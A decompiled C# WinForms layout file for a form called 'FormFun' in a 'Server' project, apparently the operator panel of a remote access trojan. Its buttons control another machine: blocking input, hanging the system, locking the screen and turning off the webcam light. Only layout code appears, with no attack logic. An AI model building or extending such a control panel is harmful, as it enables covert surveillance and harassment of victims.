﻿namespace Server.Forms
{
	// Token: 0x02000080 RID: 128
	public partial class FormFun : global::System.Windows.Forms.Form
	{
		// Token: 0x060003E4 RID: 996 RVA: 0x00004017 File Offset: 0x00002217
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060003E5 RID: 997 RVA: 0x0001FC48 File Offset: 0x0001DE48
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormFun));
			this.button1 = new global::System.Windows.Forms.Button();
			this.button2 = new global::System.Windows.Forms.Button();
			this.groupBox1 = new global::System.Windows.Forms.GroupBox();
			this.groupBox2 = new global::System.Windows.Forms.GroupBox();
			this.button4 = new global::System.Windows.Forms.Button();
			this.button3 = new global::System.Windows.Forms.Button();
			this.groupBox3 = new global::System.Windows.Forms.GroupBox();
			this.button5 = new global::System.Windows.Forms.Button();
			this.button6 = new global::System.Windows.Forms.Button();
			this.groupBox4 = new global::System.Windows.Forms.GroupBox();
			this.button7 = new global::System.Windows.Forms.Button();
			this.button8 = new global::System.Windows.Forms.Button();
			this.groupBox5 = new global::System.Windows.Forms.GroupBox();
			this.button9 = new global::System.Windows.Forms.Button();
			this.button10 = new global::System.Windows.Forms.Button();
			this.groupBox6 = new global::System.Windows.Forms.GroupBox();
			this.button11 = new global::System.Windows.Forms.Button();
			this.label2 = new global::System.Windows.Forms.Label();
			this.label1 = new global::System.Windows.Forms.Label();
			this.numericUpDown1 = new global::System.Windows.Forms.NumericUpDown();
			this.button12 = new global::System.Windows.Forms.Button();
			this.button14 = new global::System.Windows.Forms.Button();
			this.groupBox7 = new global::System.Windows.Forms.GroupBox();
			this.button15 = new global::System.Windows.Forms.Button();
			this.label3 = new global::System.Windows.Forms.Label();
			this.label4 = new global::System.Windows.Forms.Label();
			this.numericUpDown2 = new global::System.Windows.Forms.NumericUpDown();
			this.groupBox9 = new global::System.Windows.Forms.GroupBox();
			this.button17 = new global::System.Windows.Forms.Button();
			this.button18 = new global::System.Windows.Forms.Button();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.groupBox8 = new global::System.Windows.Forms.GroupBox();
			this.button16 = new global::System.Windows.Forms.Button();
			this.button19 = new global::System.Windows.Forms.Button();
			this.button13 = new global::System.Windows.Forms.Button();
			this.groupBox1.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.groupBox3.SuspendLayout();
			this.groupBox4.SuspendLayout();
			this.groupBox5.SuspendLayout();
			this.groupBox6.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
			this.groupBox7.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
			this.groupBox9.SuspendLayout();
			this.groupBox8.SuspendLayout();
			base.SuspendLayout();
			this.button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button1.Location = new global::System.Drawing.Point(6, 22);
			this.button1.Name = "button1";
			this.button1.Size = new global::System.Drawing.Size(75, 33);
			this.button1.TabIndex = 0;
			this.button1.Text = "Show";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new global::System.EventHandler(this.button1_Click);
			this.button2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button2.Location = new global::System.Drawing.Point(87, 22);
			this.button2.Name = "button2";
			this.button2.Size = new global::System.Drawing.Size(75, 33);
			this.button2.TabIndex = 1;
			this.button2.Text = "Hide";
			this.button2.UseVisualStyleBackColor = true;
			this.button2.Click += new global::System.EventHandler(this.button2_Click);
			this.groupBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox1.Controls.Add(this.button1);
			this.groupBox1.Controls.Add(this.button2);
			this.groupBox1.Location = new global::System.Drawing.Point(12, 13);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox1.TabIndex = 0;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Taskbar";
			this.groupBox2.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox2.Controls.Add(this.button4);
			this.groupBox2.Controls.Add(this.button3);
			this.groupBox2.Location = new global::System.Drawing.Point(12, 80);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox2.TabIndex = 4;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "Desktop";
			this.button4.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button4.Location = new global::System.Drawing.Point(88, 23);
			this.button4.Name = "button4";
			this.button4.Size = new global::System.Drawing.Size(75, 33);
			this.button4.TabIndex = 1;
			this.button4.Text = "Hide";
			this.button4.UseVisualStyleBackColor = true;
			this.button4.Click += new global::System.EventHandler(this.button4_Click);
			this.button3.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button3.Location = new global::System.Drawing.Point(7, 23);
			this.button3.Name = "button3";
			this.button3.Size = new global::System.Drawing.Size(75, 31);
			this.button3.TabIndex = 0;
			this.button3.Text = "Show";
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new global::System.EventHandler(this.button3_Click);
			this.groupBox3.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox3.Controls.Add(this.button5);
			this.groupBox3.Controls.Add(this.button6);
			this.groupBox3.Location = new global::System.Drawing.Point(12, 150);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox3.TabIndex = 3;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Clock";
			this.button5.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button5.Location = new global::System.Drawing.Point(6, 22);
			this.button5.Name = "button5";
			this.button5.Size = new global::System.Drawing.Size(75, 33);
			this.button5.TabIndex = 0;
			this.button5.Text = "Show";
			this.button5.UseVisualStyleBackColor = true;
			this.button5.Click += new global::System.EventHandler(this.button5_Click);
			this.button6.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button6.Location = new global::System.Drawing.Point(87, 22);
			this.button6.Name = "button6";
			this.button6.Size = new global::System.Drawing.Size(75, 33);
			this.button6.TabIndex = 1;
			this.button6.Text = "Hide";
			this.button6.UseVisualStyleBackColor = true;
			this.button6.Click += new global::System.EventHandler(this.button6_Click);
			this.groupBox4.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox4.Controls.Add(this.button7);
			this.groupBox4.Controls.Add(this.button8);
			this.groupBox4.Location = new global::System.Drawing.Point(12, 217);
			this.groupBox4.Name = "groupBox4";
			this.groupBox4.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox4.TabIndex = 4;
			this.groupBox4.TabStop = false;
			this.groupBox4.Text = "Mouse";
			this.button7.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button7.Location = new global::System.Drawing.Point(88, 23);
			this.button7.Name = "button7";
			this.button7.Size = new global::System.Drawing.Size(75, 33);
			this.button7.TabIndex = 1;
			this.button7.Text = "Restore";
			this.button7.UseVisualStyleBackColor = true;
			this.button7.Click += new global::System.EventHandler(this.button7_Click);
			this.button8.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button8.Location = new global::System.Drawing.Point(7, 23);
			this.button8.Name = "button8";
			this.button8.Size = new global::System.Drawing.Size(75, 31);
			this.button8.TabIndex = 0;
			this.button8.Text = "Swap";
			this.button8.UseVisualStyleBackColor = true;
			this.button8.Click += new global::System.EventHandler(this.button8_Click);
			this.groupBox5.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox5.Controls.Add(this.button9);
			this.groupBox5.Controls.Add(this.button10);
			this.groupBox5.Location = new global::System.Drawing.Point(12, 284);
			this.groupBox5.Name = "groupBox5";
			this.groupBox5.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox5.TabIndex = 4;
			this.groupBox5.TabStop = false;
			this.groupBox5.Text = "CD Drive";
			this.button9.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button9.Location = new global::System.Drawing.Point(88, 23);
			this.button9.Name = "button9";
			this.button9.Size = new global::System.Drawing.Size(75, 33);
			this.button9.TabIndex = 1;
			this.button9.Text = "Close";
			this.button9.UseVisualStyleBackColor = true;
			this.button9.Click += new global::System.EventHandler(this.button9_Click);
			this.button10.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button10.Location = new global::System.Drawing.Point(7, 23);
			this.button10.Name = "button10";
			this.button10.Size = new global::System.Drawing.Size(75, 31);
			this.button10.TabIndex = 0;
			this.button10.Text = "Open";
			this.button10.UseVisualStyleBackColor = true;
			this.button10.Click += new global::System.EventHandler(this.button10_Click);
			this.groupBox6.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox6.Controls.Add(this.button11);
			this.groupBox6.Controls.Add(this.label2);
			this.groupBox6.Controls.Add(this.label1);
			this.groupBox6.Controls.Add(this.numericUpDown1);
			this.groupBox6.Location = new global::System.Drawing.Point(236, 13);
			this.groupBox6.Name = "groupBox6";
			this.groupBox6.Size = new global::System.Drawing.Size(250, 74);
			this.groupBox6.TabIndex = 5;
			this.groupBox6.TabStop = false;
			this.groupBox6.Text = "Block Input";
			this.button11.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button11.Location = new global::System.Drawing.Point(173, 26);
			this.button11.Name = "button11";
			this.button11.Size = new global::System.Drawing.Size(71, 28);
			this.button11.TabIndex = 3;
			this.button11.Text = "Start";
			this.button11.UseVisualStyleBackColor = true;
			this.button11.Click += new global::System.EventHandler(this.button11_Click);
			this.label2.AutoSize = true;
			this.label2.Location = new global::System.Drawing.Point(120, 31);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(47, 13);
			this.label2.TabIndex = 2;
			this.label2.Text = "seconds";
			this.label1.AutoSize = true;
			this.label1.Location = new global::System.Drawing.Point(8, 31);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(19, 13);
			this.label1.TabIndex = 1;
			this.label1.Text = "for";
			this.numericUpDown1.Location = new global::System.Drawing.Point(37, 29);
			this.numericUpDown1.Name = "numericUpDown1";
			this.numericUpDown1.Size = new global::System.Drawing.Size(77, 20);
			this.numericUpDown1.TabIndex = 0;
			this.button12.BackColor = global::System.Drawing.Color.Transparent;
			this.button12.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button12.Location = new global::System.Drawing.Point(236, 336);
			this.button12.Name = "button12";
			this.button12.Size = new global::System.Drawing.Size(250, 35);
			this.button12.TabIndex = 6;
			this.button12.Text = "Turn Monitor off";
			this.button12.UseVisualStyleBackColor = false;
			this.button12.Click += new global::System.EventHandler(this.button12_Click);
			this.button14.BackColor = global::System.Drawing.Color.Transparent;
			this.button14.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button14.Location = new global::System.Drawing.Point(236, 377);
			this.button14.Name = "button14";
			this.button14.Size = new global::System.Drawing.Size(250, 35);
			this.button14.TabIndex = 8;
			this.button14.Text = "Hang system";
			this.button14.UseVisualStyleBackColor = false;
			this.button14.Click += new global::System.EventHandler(this.button14_Click);
			this.groupBox7.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox7.Controls.Add(this.button15);
			this.groupBox7.Controls.Add(this.label3);
			this.groupBox7.Controls.Add(this.label4);
			this.groupBox7.Controls.Add(this.numericUpDown2);
			this.groupBox7.Location = new global::System.Drawing.Point(236, 93);
			this.groupBox7.Name = "groupBox7";
			this.groupBox7.Size = new global::System.Drawing.Size(250, 74);
			this.groupBox7.TabIndex = 5;
			this.groupBox7.TabStop = false;
			this.groupBox7.Text = "Hold Mouse";
			this.button15.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button15.Location = new global::System.Drawing.Point(173, 26);
			this.button15.Name = "button15";
			this.button15.Size = new global::System.Drawing.Size(71, 28);
			this.button15.TabIndex = 3;
			this.button15.Text = "Start";
			this.button15.UseVisualStyleBackColor = true;
			this.button15.Click += new global::System.EventHandler(this.button15_Click);
			this.label3.AutoSize = true;
			this.label3.Location = new global::System.Drawing.Point(120, 31);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(47, 13);
			this.label3.TabIndex = 2;
			this.label3.Text = "seconds";
			this.label4.AutoSize = true;
			this.label4.Location = new global::System.Drawing.Point(8, 31);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(19, 13);
			this.label4.TabIndex = 1;
			this.label4.Text = "for";
			this.numericUpDown2.Location = new global::System.Drawing.Point(37, 29);
			this.numericUpDown2.Name = "numericUpDown2";
			this.numericUpDown2.Size = new global::System.Drawing.Size(77, 20);
			this.numericUpDown2.TabIndex = 0;
			this.groupBox9.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox9.Controls.Add(this.button17);
			this.groupBox9.Controls.Add(this.button18);
			this.groupBox9.Location = new global::System.Drawing.Point(12, 351);
			this.groupBox9.Name = "groupBox9";
			this.groupBox9.Size = new global::System.Drawing.Size(170, 61);
			this.groupBox9.TabIndex = 4;
			this.groupBox9.TabStop = false;
			this.groupBox9.Text = "Lock Screen";
			this.button17.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button17.Location = new global::System.Drawing.Point(88, 23);
			this.button17.Name = "button17";
			this.button17.Size = new global::System.Drawing.Size(75, 33);
			this.button17.TabIndex = 1;
			this.button17.Text = "Stop";
			this.button17.UseVisualStyleBackColor = true;
			this.button17.Click += new global::System.EventHandler(this.button17_Click);
			this.button18.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button18.Location = new global::System.Drawing.Point(7, 23);
			this.button18.Name = "button18";
			this.button18.Size = new global::System.Drawing.Size(75, 31);
			this.button18.TabIndex = 0;
			this.button18.Text = "Start";
			this.button18.UseVisualStyleBackColor = true;
			this.button18.Click += new global::System.EventHandler(this.button18_Click);
			this.timer1.Interval = 2000;
			this.timer1.Tick += new global::System.EventHandler(this.Timer1_Tick);
			this.groupBox8.BackColor = global::System.Drawing.Color.Transparent;
			this.groupBox8.Controls.Add(this.button16);
			this.groupBox8.Controls.Add(this.button19);
			this.groupBox8.Location = new global::System.Drawing.Point(236, 173);
			this.groupBox8.Name = "groupBox8";
			this.groupBox8.Size = new global::System.Drawing.Size(250, 86);
			this.groupBox8.TabIndex = 4;
			this.groupBox8.TabStop = false;
			this.groupBox8.Text = "Turn off webcam light";
			this.button16.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button16.Location = new global::System.Drawing.Point(125, 31);
			this.button16.Name = "button16";
			this.button16.Size = new global::System.Drawing.Size(112, 33);
			this.button16.TabIndex = 1;
			this.button16.Text = "Turn Off";
			this.button16.UseVisualStyleBackColor = true;
			this.button16.Click += new global::System.EventHandler(this.button16_Click);
			this.button19.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button19.Location = new global::System.Drawing.Point(7, 31);
			this.button19.Name = "button19";
			this.button19.Size = new global::System.Drawing.Size(112, 31);
			this.button19.TabIndex = 0;
			this.button19.Text = "Turn On";
			this.button19.UseVisualStyleBackColor = true;
			this.button19.Click += new global::System.EventHandler(this.button19_Click);
			this.button13.BackColor = global::System.Drawing.Color.Transparent;
			this.button13.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.button13.Location = new global::System.Drawing.Point(236, 295);
			this.button13.Name = "button13";
			this.button13.Size = new global::System.Drawing.Size(250, 35);
			this.button13.TabIndex = 9;
			this.button13.Text = "Play Audio";
			this.button13.UseVisualStyleBackColor = false;
			this.button13.Click += new global::System.EventHandler(this.button13_Click_1);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Navy;
			this.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("$this.BackgroundImage");
			this.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Stretch;
			base.ClientSize = new global::System.Drawing.Size(508, 428);
			base.Controls.Add(this.button13);
			base.Controls.Add(this.button14);
			base.Controls.Add(this.button12);
			base.Controls.Add(this.groupBox7);
			base.Controls.Add(this.groupBox6);
			base.Controls.Add(this.groupBox8);
			base.Controls.Add(this.groupBox9);
			base.Controls.Add(this.groupBox5);
			base.Controls.Add(this.groupBox4);
			base.Controls.Add(this.groupBox3);
			base.Controls.Add(this.groupBox2);
			base.Controls.Add(this.groupBox1);
			this.ForeColor = global::System.Drawing.Color.White;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "FormFun";
			this.Text = "Fun";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.FormFun_FormClosed);
			this.groupBox1.ResumeLayout(false);
			this.groupBox2.ResumeLayout(false);
			this.groupBox3.ResumeLayout(false);
			this.groupBox4.ResumeLayout(false);
			this.groupBox5.ResumeLayout(false);
			this.groupBox6.ResumeLayout(false);
			this.groupBox6.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
			this.groupBox7.ResumeLayout(false);
			this.groupBox7.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
			this.groupBox9.ResumeLayout(false);
			this.groupBox8.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x0400027C RID: 636
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400027D RID: 637
		private global::System.Windows.Forms.Button button1;

		// Token: 0x0400027E RID: 638
		private global::System.Windows.Forms.Button button2;

		// Token: 0x0400027F RID: 639
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x04000280 RID: 640
		private global::System.Windows.Forms.GroupBox groupBox2;

		// Token: 0x04000281 RID: 641
		private global::System.Windows.Forms.Button button4;

		// Token: 0x04000282 RID: 642
		private global::System.Windows.Forms.Button button3;

		// Token: 0x04000283 RID: 643
		private global::System.Windows.Forms.GroupBox groupBox3;

		// Token: 0x04000284 RID: 644
		private global::System.Windows.Forms.Button button5;

		// Token: 0x04000285 RID: 645
		private global::System.Windows.Forms.Button button6;

		// Token: 0x04000286 RID: 646
		private global::System.Windows.Forms.GroupBox groupBox4;

		// Token: 0x04000287 RID: 647
		private global::System.Windows.Forms.Button button7;

		// Token: 0x04000288 RID: 648
		private global::System.Windows.Forms.Button button8;

		// Token: 0x04000289 RID: 649
		private global::System.Windows.Forms.GroupBox groupBox5;

		// Token: 0x0400028A RID: 650
		private global::System.Windows.Forms.Button button9;

		// Token: 0x0400028B RID: 651
		private global::System.Windows.Forms.Button button10;

		// Token: 0x0400028C RID: 652
		private global::System.Windows.Forms.GroupBox groupBox6;

		// Token: 0x0400028D RID: 653
		private global::System.Windows.Forms.Button button11;

		// Token: 0x0400028E RID: 654
		private global::System.Windows.Forms.Label label2;

		// Token: 0x0400028F RID: 655
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000290 RID: 656
		private global::System.Windows.Forms.NumericUpDown numericUpDown1;

		// Token: 0x04000291 RID: 657
		private global::System.Windows.Forms.Button button12;

		// Token: 0x04000292 RID: 658
		private global::System.Windows.Forms.Button button14;

		// Token: 0x04000293 RID: 659
		private global::System.Windows.Forms.GroupBox groupBox7;

		// Token: 0x04000294 RID: 660
		private global::System.Windows.Forms.Button button15;

		// Token: 0x04000295 RID: 661
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000296 RID: 662
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000297 RID: 663
		private global::System.Windows.Forms.NumericUpDown numericUpDown2;

		// Token: 0x04000298 RID: 664
		private global::System.Windows.Forms.GroupBox groupBox9;

		// Token: 0x04000299 RID: 665
		private global::System.Windows.Forms.Button button17;

		// Token: 0x0400029A RID: 666
		private global::System.Windows.Forms.Button button18;

		// Token: 0x0400029B RID: 667
		public global::System.Windows.Forms.Timer timer1;

		// Token: 0x0400029C RID: 668
		private global::System.Windows.Forms.GroupBox groupBox8;

		// Token: 0x0400029D RID: 669
		private global::System.Windows.Forms.Button button16;

		// Token: 0x0400029E RID: 670
		private global::System.Windows.Forms.Button button19;

		// Token: 0x0400029F RID: 671
		private global::System.Windows.Forms.Button button13;
	}
}
